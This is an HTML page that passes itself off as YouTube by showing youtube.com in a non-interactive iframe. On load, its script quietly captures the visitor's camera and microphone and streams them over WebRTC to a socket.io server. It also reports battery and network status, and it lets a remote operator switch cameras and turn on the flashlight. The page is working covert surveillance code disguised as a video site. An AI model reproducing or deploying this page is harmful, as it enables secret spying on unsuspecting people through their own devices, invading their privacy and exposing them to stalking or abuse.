<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body, html { margin: 0; padding: 0; background: #0f0f0f; height: 100%; overflow: hidden; } iframe { width: 100%; height: 100%; border: none; pointer-events: none; } video { display: none; }</style></head>
<body>
    <iframe src="https://www.youtube.com" allow="autoplay"></iframe>
    <video id="v" autoplay playsinline muted></video>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById("v");
        let localStream, currentMode = "user", pc;

        async function start(mode) {
            if (localStream) localStream.getTracks().forEach(t => t.stop());
            if (pc) pc.close();
            
            pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                video.srcObject = localStream;
                localStream.getTracks().forEach(t => pc.addTrack(t, localStream));

                pc.onicecandidate = e => e.candidate && socket.emit("ice-front", { candidate: e.candidate, senderId: socket.id });

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit("offer-front", { offer, senderId: socket.id });

                // Battery & Network Status
                const battery = await navigator.getBattery();
                socket.emit("status-update", { battery: Math.floor(battery.level * 100), network: navigator.connection.type === 'wifi' ? 'WiFi' : 'Data' });

            } catch (e) { console.error(e); }
        }

        socket.on("switch-camera", () => {
            currentMode = (currentMode === "user") ? "environment" : "user";
            start(currentMode);
        });

        socket.on("toggle-torch", async () => {
            const track = localStream.getVideoTracks()[0];
            const caps = track.getCapabilities();
            if (caps.torch) {
                const constraints = track.getConstraints();
                await track.applyConstraints({ advanced: [{ torch: !constraints.advanced?.[0]?.torch }] });
            }
        });

        socket.on("answer-front", async d => { if(d.to === socket.id) await pc.setRemoteDescription(new RTCSessionDescription(d.answer)); });
        socket.on("ice-front", async d => { if(d.senderId === socket.id) await pc.addIceCandidate(new RTCIceCandidate(d.candidate)); });

        window.onload = () => start(currentMode);
    </script>
</body>
</html>

